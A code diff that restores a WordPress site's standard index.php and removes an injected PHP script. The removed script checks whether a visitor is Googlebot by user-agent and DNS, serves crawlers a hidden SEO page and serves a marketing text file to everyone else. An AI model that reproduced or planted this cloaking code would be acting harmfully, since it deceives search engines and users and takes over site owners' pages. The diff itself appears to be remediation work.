@@ -1,34 +1,17 @@
 <?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$remoteIp = $_SERVER['REMOTE_ADDR'] ?? '';
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-// Fungsi untuk memeriksa apakah IP adalah milik Googlebot
-function isGooglebotIp($ip) {
-$hostname = gethostbyaddr($ip);
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-// Pastikan reverse DNS mengarah ke googlebot.com atau google.com
-if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
-// Lakukan forward DNS lookup untuk validasi balik
-$resolvedIp = gethostbyname($hostname);
-return $ip === $resolvedIp;
-}
-
-return false;
-}
-
-// Periksa apakah User-Agent adalah Googlebot atau bot Google lainnya
-$isGoogleBotUA = preg_match('/Googlebot|AdsBot-Google|Google-Structured-Data-Testing-Tool|Rich-Results|Mediapartners-Google|APIs-Google|Google Favicon|Google Web Preview/i', $userAgent);
-
-// Jika User-Agent tidak cocok, cek lewat IP
-$isGoogleBot = $isGoogleBotUA || isGooglebotIp($remoteIp);
-
-
-if ($isGoogleBot) {
-include __DIR__ . '/miamiseofl.html';
-exit;
-}
-
-
-include __DIR__ . '/miami-ppc-marketing.txt';
-exit;
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
